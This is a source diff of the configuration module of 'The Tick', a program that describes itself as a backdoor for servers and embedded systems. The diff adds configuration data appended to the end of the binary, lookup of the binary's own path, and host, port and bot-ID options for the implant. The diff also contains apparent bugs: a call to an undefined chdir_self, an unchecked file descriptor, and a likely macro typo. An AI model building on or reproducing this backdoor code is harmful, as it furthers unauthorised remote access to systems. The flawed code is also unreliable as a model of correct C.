@@ -14,14 +14,9 @@
 #include "base64.h"
 #include "uuid4.h"
 
-// Nifty macro trick to expand using quotes.
-// https://stackoverflow.com/a/3419392/426293
-#define _Q(x) #x
-#define QUOTE(x) _Q(x)
-
 /****************************************************************************/
 
-#if TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV || TICK_CONFIG_USE_FILE
+#if TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV || TICK_CONFIG_USE_FILE || TICK_CONFIG_USE_BIN
 
 // Pointer to option handler function.
 typedef int (*OptionHandler)(char *input, void *output, size_t size);
@@ -84,9 +79,8 @@ int _option_timestamp(char *input, void *output, size_t size)
 }
 #endif
 
-// Special handler for the configuration file.
-#if TICK_CONFIG_USE_FILE && (TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV)
-int _option_config_file(char *input, void *output, size_t size)
+#if TICK_CONFIG_USE_FILE
+int _handler_config_file(char *input, void *output, size_t size)
 {
     static int depth = 0;
     int res = -1;
@@ -108,9 +102,11 @@ int _option_config_file(char *input, void *output, size_t size)
 #define OPTION_TIMESTAMP _option_timestamp
 #define OPTION_UUID      _option_uuid
 #define OPTION_BLOB      _option_base64
+#define HANDLER_CONFIG   _handler_config_file
 
 // Macro to populate the Options structure more easily.
 #define DEFINE_OPTION(name, member, handler) { name, offsetof(Settings, member), sizeof(((Settings*)0)->member), handler }
+#define DEFINE_CALLBACK(name, handler) { name, 0, sizeof(Settings), handler }
 
 // Status Options structure with the supported options that will be parsed.
 // Every option works as a positional argument based on the index of this table.
@@ -127,13 +123,15 @@ static const Option options_table[] = {
 
 #if TICK_FEATURES_CRYPTO
     DEFINE_OPTION("ssl",    use_ssl,    OPTION_FLAG),
+    // TODO add certificate stuff here
 #endif
 
+    // Undocumented option, used internally. Careful with it!
+    // There should never be two bots with the same ID!
     DEFINE_OPTION("uuid",   uuid,       OPTION_UUID),
 
-    // Special entry for the configuration file.
-#if TICK_CONFIG_USE_FILE && (TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV || TICK_MAX_CONFIG_FILE_DEPTH > 1)
-    {"config", 0, sizeof(Settings), _option_config_file}
+#if TICK_CONFIG_USE_FILE
+    DEFINE_CALLBACK("config", HANDLER_CONFIG)
 #endif
 
 };
@@ -213,14 +211,6 @@ int parse_command_line(Settings *s, int argc, char *argv[], int skip_first)
 
                 }
 
-#if TICK_VERBOSE
-                // There is only --help, because -h means --host.
-                if (strcmp(&argv[i][2], "help") == 0) {
-                    show_help(s, skip_first ? NULL : argv[0]);
-                    exit(0);
-                }
-#endif
-
                 // It's a long option.
                 option_index = find_long_option(&argv[i][2]);
                 i++;
@@ -263,8 +253,6 @@ int parse_command_line(Settings *s, int argc, char *argv[], int skip_first)
     // Return 0 on success, -1 on failure.
     return success;
 }
-
-#if TICK_CONFIG_USE_ENV || TICK_CONFIG_USE_FILE
 
 // Tokenize the given string in place and place pointers to each argument
 // in the given array. If NULL is passed instead of an array, the function
@@ -378,8 +366,6 @@ int split_command_line(char *cmdline, char *argv[])
     return count;
 }
 
-#if TICK_CONFIG_USE_ENV
-
 // Parse command line arguments passed via the environment.
 int parse_environment(Settings *s)
 {
@@ -396,11 +382,54 @@ int parse_environment(Settings *s)
     return 0;
 }
 
-#endif
-#if TICK_CONFIG_USE_FILE
-
 // Parse command line arguments passed via a file.
 int parse_config_file(Settings *s, char *filename)
+{
+
+    // Open the file.
+    LOG("Using configuration file: %s\n", filename);
+    int fd = open(filename, O_RDONLY | O_SEQUENTIAL);
+    if (fd < 0) {
+        LOG("Error opening config file!\n");
+        return -1;
+    }
+
+    // Parse the file.
+    int success = parse_config_fd(s, fd);
+
+    // Close the file and return.
+    close(fd);
+    return success;
+}
+
+// Read file contents until the file is over or a maximum is reached.
+// File contents are assumed to be text.
+// If the file cannot be opened, abort.
+// If the file is too large, it will be silently truncated.
+// Returns number of bytes on success or -1 on failure.
+// Output buffer contains the text read, followed by a null terminator.
+ssize_t load_file_contents(int fd, char *buffer, size_t size)
+{
+    memset(buffer, 0, size);
+    ssize_t remaining = size - 1; // null terminated
+    ssize_t chunk = -1;
+    char *ptr = buffer;
+    ssize_t count = 0;
+    while (remaining > 0) {
+        chunk = read(fd, ptr, remaining);
+        if (chunk == 0) break;
+        if (chunk < 0) {
+            return -1;
+        }
+        count += chunk;
+        ptr += chunk;
+        remaining -= chunk;
+    }
+    return count;
+}
+
+// Parse command line arguments read from an open file descriptor.
+int parse_config_fd(Settings *s, int fd)
 {
     int success = 0;
 
@@ -416,56 +445,213 @@ int parse_config_file(Settings *s, char *filename)
     // Read the entire contents of the file into memory.
     // If the file cannot be opened, abort.
     // If the file is too large, it will be silently truncated.
-    LOG("Using configuration file: %s\n", filename);
-    int fd = open(filename, O_RDONLY | O_SEQUENTIAL);
-    if (fd < 0) {
-        LOG("Error opening config file!\n");
-        return -1;
-    }
-    memset(buffer, 0, TICK_MAX_CONFIG_FILE_SIZE);
-    ssize_t remaining = TICK_MAX_CONFIG_FILE_SIZE - 1; // null terminated
-    ssize_t chunk = -1;
-    char *ptr = buffer;
-    while (remaining > 0) {
-        chunk = read(fd, ptr, remaining);
-        if (chunk == 0) break;
-        if (chunk < 0) {
-            success = -1;
-            break;
+    if (load_file_contents(fd, buffer, TICK_MAX_CONFIG_FILE_SIZE) < 0) {
+        success = -1;
+    } else {
+
+        // Parse the configuration file.
+        int argc = split_command_line(buffer, NULL);
+        if (argc > 0) {
+            char *argv[argc];
+            memset(argv, 0, sizeof(argv));
+            split_command_line(buffer, argv);
+            success = parse_command_line(s, argc, argv, 0);
         }
-        ptr = ptr + chunk;
-        remaining = remaining - chunk;
-    }
-    close(fd);
-    fd = -1;
-
-    // Parse the configuration file.
-    int argc = split_command_line(buffer, NULL);
-    if (argc > 0) {
-        char *argv[argc];
-        memset(argv, 0, sizeof(argv));
-        split_command_line(buffer, argv);
-        success |= parse_command_line(s, argc, argv, 0);
     }
 
-    // We're done!
+    // Free the memory and return.
 #if TICK_MAX_CONFIG_FILE_SIZE > 0x1000
     free(buffer);
 #endif
     return success;
 }
 
+// Determines the name of our own binary.
+// Works for both standalone programs and shared libraries.
+// Returns the number of characters *required* for the filename;
+// if the buffer is smaller than that it will be truncated.
+// You can detect this by comparing the return value to the
+// number of characters that fit in your buffer.
+
+#if defined (_WIN32)
+
+size_t get_self_filename(char *output, size_t size)
+{
+    HMODULE hModule = NULL;
+    GetModuleHandleExA(
+        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+        (void *) get_self_filename, &hModule);
+    memset(output, 0, size);    // needed on XP
+    return GetModuleFileNameA(hModule, output, size);
+}
+
+#elif defined (__ANDROID__)
+
+// We don't have dladdr() consistently in all Android versions or archs,
+// but we do know we have support for /proc/self/maps so let's parse that.
+// I would prefer to detect this more accurately at compile time but sadly
+// it only gives an error when linking, so there's nothing I can do.
+
+size_t get_self_filename(char *output, size_t size)
+{
+    // "%s-%s %s %s %s %s\t%s\n",addr1,addr2,perm,offset,dev,inode,pathname
+    size_t libname_len = 0;
+    FILE *f = fopen("/proc/self/maps", "r");
+    if (f != NULL) {
+        for (;;) {
+            char *line = NULL;
+            size_t line_len = 0;
+            if (getline(&line, &line_len, f) < 0) break;
+            char *dash = strchr(line, '-');
+            if (dash != NULL) {
+                char *space = strchr(dash, ' ');
+                if (space != NULL) {
+                    size_t len = strlen(line);
+                    line[len - 1] = 0;
+                    char *libname = strrchr(line, '\t');
+                    if (libname == NULL) {
+                        libname = strrchr(line, ' ');
+                    }
+                    if (libname != NULL) {
+                        libname++;
+                        if (libname[0] == '/') {
+                            size_t begin_len = dash - line;
+                            size_t end_len = space - (dash + 1);
+                            char *begin_str = line;
+                            char *end_str = dash + 1;
+                            begin_str[begin_len] = 0;
+                            end_str[end_len] = 0;
+                            char *tmp;
+                            size_t begin = strtoul(begin_str, &tmp, 16);
+                            size_t end = strtoul(end_str, &tmp, 16);
+                            size_t myself = (size_t) &get_self_filename;
+                            if (begin < myself && myself < end) {
+                                memset(output, 0, size);
+                                strncpy(output, libname, size);
+                                libname_len = strlen(libname);
+                            }
+                            break;
+                        }
+                    }
+                }
+            }
+            free(line);
+        }
+    }
+    return libname_len;
+}
+
+#else
+
+// Using a non-standard GNU extension, dladdr().
+// If you're building for some platform that doesn't support this,
+// check out the Android solution.
+
+// TODO: on BSD neither trick will work, but there is another similar
+// function that can be used.
+
+#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
 #endif
+#ifndef __USE_GNU
+#define __USE_GNU
 #endif
+#include <dlfcn.h>
+
+size_t get_self_filename(char *output, size_t size)
+{
+    Dl_info info;
+    memset(&info, 0, sizeof(info));
+    if (dladdr(get_self_filename, &info)) {
+        memset(output, 0, size);
+        strncpy(output, info.dli_fname, size);
+        return strlen(info.dli_fname);
+    }
+    return 0;
+}
+
+#endif
+
+// Change the current directory to where our binary is located.
+void chdir_to_self()
+{
+    char pathname[512];
+    if (get_self_filename(pathname, sizeof(pathname))) {
+        dirname(pathname);
+        LOG("Switching to directory: %s\n", pathname);
+        chdir(pathname);
+    }
+}
+
+// Embedded configuration files are just tacked at the end of the binary.
+// This works because all binary formats in all platforms have their own
+// internal structure and any data past the end of the code is ignored.
+// To avoid having to actually be aware of each binary file format, we
+// just start reading backwards from the end of the file until we reach a
+// newline character. This works because we know the config data is always
+// separated from the binary with a newline, and the config itself must be
+// in a single line, so we can't accidentally take a byte from the code.
+
+// On success, returns a file descriptor already positioned right where the
+// config data is located. On error returns -1. If no embedded config is
+// present returns -2. The caller must close the file descriptor.
+int open_self_config()
+{
+    // Get our own pathname.
+    char filename[512];
+    if (get_self_filename(filename, sizeof(filename)) == 0) {
+        LOG("Error getting my own pathname!\n");
+        return -1;
+    }
+
+    // Open our own file.
+    int fd = open(filename, O_RDONLY | O_BINARY | O_SEQUENTIAL);
+    if (fd < 0) {
+        LOG("Error opening my own binary!\n");
+        return -1;
+    }
+
+    // Go to the end of the file and read backwards until finding a newline.
+    size_t filesize = lseek(fd, -1, SEEK_END);
+    for (;;) {
+        char c = 0;
+        if (read(fd, &c, 1) <= 0) {
+            LOG("Error reading myself!\n");
+            close(fd);
+            return -1;
+        }
+        if (c == '\n') break;
+        size_t pos = lseek(fd, -2, SEEK_CUR);
+        if (pos == 0 || (filesize - pos) > TICK_MAX_CONFIG_FILE_SIZE) {
+            LOG("Embedded configuration not found\n");
+            close(fd);
+            return -2;
+        }
+    }
+
+    // Return the open file descriptor.
+    // It's the caller's responsibility to close it.
+    return fd;
+}
+
+int parse_embedded_config_file(Settings *s)
+{
+    // Open the binary and find the configuration.
+    int fd = open_self_config();
+
+    // Parse the file.
+    int success = parse_config_fd(s, fd);
+
+    // Close the file and return.
+    close(fd);
+    return success;
+}
+
 #endif
 
 /****************************************************************************/
 
-#if TICK_CONFIG_USE_ARGV
-void get_configuration(Settings *s, int argc, char *argv[])
-#else
-void get_configuration(Settings *s)
-#endif
+void get_default_configuration(Settings *s)
 {
     // Zero out the memory structure for the settings.
     // We need this because not all values will be set by the code below.
@@ -476,7 +662,7 @@ void get_configuration(Settings *s)
     // Useful for situations where you can't find a way to pass the
     // configuration to the bot, so you just make a custom build.
 #ifdef TICK_CONFIG_HOSTNAME
-    strncpy(s->hostname, QUOTE(TICK_CONFIG_HOSTNAME), sizeof(s->hostname));
+    strncpy(s->hostname, TICK_CONFIG_HOSTNAME, sizeof(s->hostname));
 #endif
 #ifdef TICK_CONFIG_PORT
     s->port = TICK_CONFIG_PORT;
@@ -494,15 +680,31 @@ void get_configuration(Settings *s)
     s->use_ssl = TICK_CONFIG_USE_SSL;
 #endif
 #endif
+}
 
-    // If configuration file parsing is enabled and we have a built in
-    // configuration file name, parse it now.
-#if TICK_CONFIG_USE_FILE
-#ifdef TICK_CONFIG_FILE_NAME
-    if (parse_config_file(s, QUOTE(TICK_CONFIG_FILE_NAME)) < 0) {
+void get_configuration(Settings *s, int argc, char *argv[])
+{
+    // Initialize the structure with the default configuration.
+    get_default_configuration(s);
+
+    // If we have an embedded configuration data, parse it now.
+#if TICK_CONFIG_USE_BIN
+#if TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV
+    if (parse_embedded_config_file(s) == -1) {
+        LOG("Error parsing embedded configuration! Continuing regardless...\n");
+    }
+#else
+#endif
+#endif
+
+    // If we have a built in configuration file name, parse it now.
+    // Assume a relative pathname will be relative to where our binary is
+    // located, rather than whatever the current directory happens to be.
+#if TICK_CONFIG_USE_FILE && defined (TICK_CONFIG_FILE_NAME)
+    chdir_self();
+    if (parse_config_file(s,  TICK_CONFIG_FILE_NAME) < 0) {
         LOG("Error parsing configuration file! Continuing regardless...\n");
     }
-#endif
 #endif
 
     // If environment variable parsing is enabled, do it now.
@@ -518,19 +720,14 @@ void get_configuration(Settings *s)
         LOG("Error parsing command line! Continuing regardless...\n");
     }
 #endif
-
 }
 
-#if TICK_VERBOSE
+#if TICK_VERBOSE && (TICK_CONFIG_USE_ARGV || TICK_CONFIG_ENV)
 
 // Show a user friendly help message.
 // For a smarter message pass it the Settings structure and argv[0].
 // These are optional, however.
-void show_help(Settings *s, char *execname
-#if !(TICK_CONFIG_USE_ARGV || TICK_CONFIG_ENV)
-__attribute__((unused))
-#endif
-)
+void show_help(Settings *s, char *execname)
 {
     // Start by showing the banner.
     printf("\nThe Tick, a simple backdoor for servers and embedded systems.\n");
@@ -560,18 +757,17 @@ __attribute__((unused))
         "=\"<options>\" %s\n"
 #endif
         "\nAvailable options:\n"
-        "\t--host HOSTNAME\n"
-        "\t--port PORT\n"
+        "\t-h, --host HOSTNAME\n"
+        "\t-p, --port PORT\n"
 #if TICK_FEATURES_CRYPTO
-        "\t--ssl 1 for SSL, 0 for plaintext\n"
+        "\t-s, --ssl 1 for SSL, 0 for plaintext\n"
 #endif
 #if TICK_FEATURES_TIME_LIMIT
-        "\t--begin EPOCH\n"
-        "\t--end EPOCH\n"
+        "\t-b, --begin EPOCH\n"
+        "\t-e, --end EPOCH\n"
 #endif
-        "\t--uuid UUID\n"
 #if TICK_CONFIG_USE_FILE
-        "\t--config FILE\n"
+        "\t-c, --config FILE\n"
 #endif
         ;
     printf(usage, execname);
@@ -582,26 +778,7 @@ __attribute__((unused))
     Settings tmp;
     if (s == NULL) {
         s = &tmp;
-        memset(&tmp, 0, sizeof(tmp));
-#ifdef TICK_CONFIG_HOSTNAME
-        strncpy(tmp.hostname, QUOTE(TICK_CONFIG_HOSTNAME), sizeof(s->hostname));
-#endif
-#ifdef TICK_CONFIG_PORT
-        tmp.port = TICK_CONFIG_PORT;
-#endif
-#if TICK_FEATURES_TIME_LIMIT
-# ifdef TICK_CONFIG_TIME_LIMIT_START
-        tmp.start_time = TICK_CONFIG_TIME_LIMIT_START;
-# endif
-# ifdef TICK_CONFIG_TIME_LIMIT_END
-        tmp.end_time = TICK_CONFIG_TIME_LIMIT_END;
-# endif
-#endif
-#if TICK_FEATURES_CRYPTO
-#ifdef TICK_CONFIG_USE_SSL
-        tmp.use_ssl = TICK_CONFIG_USE_SSL;
-#endif
-#endif
+        get_default_configuration(s);
     }
 
     // If there is a pentesting time window, show it.
@@ -643,8 +820,8 @@ __attribute__((unused))
 #if TICK_CONFIG_USE_FILE
 #ifdef TICK_CONFIG_FILE_NAME
     printf("\n"
-        "Configuration file location:\n\t"
-        QUOTE(TICK_CONFIG_FILE_NAME)
+        "Configuration file name:\n\t"
+        TICK_CONFIG_FILE_NAME
         "\n");
 #endif
 #endif
